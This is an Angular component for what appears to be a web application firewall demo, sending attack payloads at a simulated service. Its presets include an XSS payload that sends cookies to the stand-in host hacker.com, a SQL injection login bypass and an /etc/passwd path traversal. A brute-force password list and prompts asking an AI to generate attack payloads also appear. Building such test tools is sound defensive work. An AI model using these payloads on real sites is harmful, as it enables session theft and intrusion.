import { Component, ChangeDetectionStrategy, inject, signal, effect } from '@angular/core';
import { CommonModule } from '@angular/common';
import { WafService } from '../../services/waf.service';
import { FormsModule } from '@angular/forms';
import { AiAttackStep } from '../../types';

interface AttackResult {
  timestamp: Date;
  attackType: string;
  payload: string;
  result: string;
  success: boolean;
}

type TargetEndpoint = '/reviews' | '/login' | '/products';

interface PresetPayload {
    name: string;
    payload: string;
    endpoint: TargetEndpoint;
    type: 'XSS' | 'SQL Injection' | 'Path Traversal';
}

@Component({
  selector: 'app-attacker',
  standalone: true,
  imports: [CommonModule, FormsModule],
  templateUrl: './attacker.component.html',
  changeDetection: ChangeDetectionStrategy.OnPush,
})
export class AttackerComponent {
  private wafService = inject(WafService);
  attackLog = signal<AttackResult[]>([]);

  // Manual Attack
  manualEndpoint = signal<TargetEndpoint>('/reviews');
  manualPayload = signal('');
  
  presetPayloads: PresetPayload[] = [
      { name: 'Basic XSS', payload: `<img src=x onerror="alert('GuardX: XSS Attack Successful!')">`, endpoint: '/reviews', type: 'XSS' },
      { name: 'Cookie Stealer XSS', payload: `<script>document.location='http://hacker.com/?c='+document.cookie</script>`, endpoint: '/reviews', type: 'XSS' },
      { name: 'Login Bypass SQLi', payload: `' OR '1'='1'; --`, endpoint: '/login', type: 'SQL Injection' },
      { name: 'Path Traversal', payload: '../../../../etc/passwd', endpoint: '/products', type: 'Path Traversal' },
  ];

  // Brute Force
  isBruteForcing = signal(false);

  // AI Attack Swarm
  isAiAttacking = signal(false);
  aiAttackPlan = signal<AiAttackStep[]>([]);
  
  constructor() {
    effect(() => {
      const payloadFromGenerator = this.wafService.payloadForAttacker();
      if (payloadFromGenerator) {
        this.manualPayload.set(payloadFromGenerator);
        // Clear the signal so it's only used once
        this.wafService.payloadForAttacker.set('');
      }
    });
  }

  usePreset(preset: PresetPayload) {
    this.manualEndpoint.set(preset.endpoint);
    this.manualPayload.set(preset.payload);
  }

  launchManualAttack() {
    const payload = this.manualPayload();
    const endpoint = this.manualEndpoint();
    const result = this.wafService.processRequest({
      path: endpoint,
      method: 'POST',
      payload: payload,
    });
    this.logAttack('Manual Attack', payload, result);
  }
  
  private async runBruteForceSequence(): Promise<void> {
    const passwords = ['12345', 'password', 'admin', 'qwerty', 'pass123', 'root', '12345678'];
    for (let i = 0; i < passwords.length; i++) {
        if (!this.isAiAttacking() && !this.isBruteForcing()) break; // Can be stopped by either control
        const payload = `admin:${passwords[i]}`;
        const result = this.wafService.processRequest({
          path: '/login',
          method: 'POST',
          payload: `brute-force-attempt-${i+1}`
        });
        this.logAttack(this.isAiAttacking() ? 'Brute-Force (AI Swarm)' : 'Brute-Force', payload, result);
        if (result.message.includes('Blocked')) {
            break; // Stop if rate-limited
        }
        await new Promise(resolve => setTimeout(resolve, 300));
    }
  }

  async launchBruteForce() {
    this.isBruteForcing.set(true);
    await this.runBruteForceSequence();
    this.isBruteForcing.set(false);
  }

  stopBruteForce() {
    this.isBruteForcing.set(false);
  }

  async launchAiAttack() {
    this.isAiAttacking.set(true);
    const attackPrompts: Omit<AiAttackStep, 'status' | 'payload' | 'result' | 'success'>[] = [
      { id: 1, type: 'generate_payload', title: 'Attempt SQLi Login Bypass', prompt: "a SQL injection payload to bypass a login form, trying to log in as 'admin'", endpoint: '/login' },
      { id: 2, type: 'brute_force', title: 'Launch Brute-Force Attack', prompt: '', endpoint: '/login' },
      { id: 3, type: 'generate_payload', title: 'Modify Product Name', prompt: "a payload for a POST request to /products that is a string containing a JSON-like key-value pair to change the product name to 'Hacked Quantum Device'", endpoint: '/products'},
      { id: 4, type: 'generate_payload', title: 'Modify Product Price', prompt: "a payload for a POST request to /products that is a string containing a JSON-like key-value pair to change the product price to 1.00", endpoint: '/products'},
      { id: 5, type: 'generate_payload', title: 'Modify Product Description', prompt: "a payload for a POST request to /products that is a string containing a JSON-like key-value pair to change the product description to 'This device has been compromised by GuardX testers.'", endpoint: '/products'},
      { id: 6, type: 'generate_payload', title: 'Post Malicious Review', prompt: "a fake customer review that says 'This product is amazing! Bypass Success!' and also contains a simple XSS payload using an HTML tag to show an alert with the text 'XSS'", endpoint: '/reviews'}
    ];

    this.aiAttackPlan.set(attackPrompts.map(p => ({
      ...p,
      status: 'Pending',
      payload: null,
      result: null,
      success: null
    })));

    for (const step of this.aiAttackPlan()) {
      if (!this.isAiAttacking()) break;
      
      this.aiAttackPlan.update(plan => plan.map(s => s.id === step.id ? { ...s, status: 'In Progress' } : s));
      
      if (step.type === 'brute_force') {
        this.aiAttackPlan.update(plan => plan.map(s => s.id === step.id ? { ...s, payload: 'Executing 7 common passwords...' } : s));
        await this.runBruteForceSequence();
        const success = this.wafService.targetPageLoginStatus() !== 'Logged Out';
        this.aiAttackPlan.update(plan => plan.map(s => s.id === step.id ? { ...s, status: 'Completed', result: `Brute-force sequence finished. ${success ? 'Login successful.' : 'Login failed.'}`, success } : s));
      } else {
        await this.wafService.generatePayloadFromPrompt({ prompt: step.prompt });
        const generatedPayload = this.wafService.aiGeneratedPayload()?.payload ?? 'AI failed to generate payload';
        this.wafService.aiGeneratedPayload.set(null); 
        
        this.aiAttackPlan.update(plan => plan.map(s => s.id === step.id ? { ...s, payload: generatedPayload } : s));
        await new Promise(resolve => setTimeout(resolve, 500));

        const result = this.wafService.processRequest({
          path: step.endpoint,
          method: 'POST',
          payload: generatedPayload
        });
        this.logAttack('AI Swarm', generatedPayload, result);

        this.aiAttackPlan.update(plan => plan.map(s => s.id === step.id ? { ...s, status: 'Completed', result: result.message, success: result.success } : s));
      }
      
      await new Promise(resolve => setTimeout(resolve, 1000));
    }

    this.isAiAttacking.set(false);
  }

  stopAiAttack() {
    this.isAiAttacking.set(false);
  }

  private logAttack(attackType: string, payload: string, result: { success: boolean; message: string }) {
    this.attackLog.update(log => [
      {
        timestamp: new Date(),
        attackType,
        payload,
        result: result.message,
        success: result.success
      },
      ...log
    ].slice(0, 50));
  }
}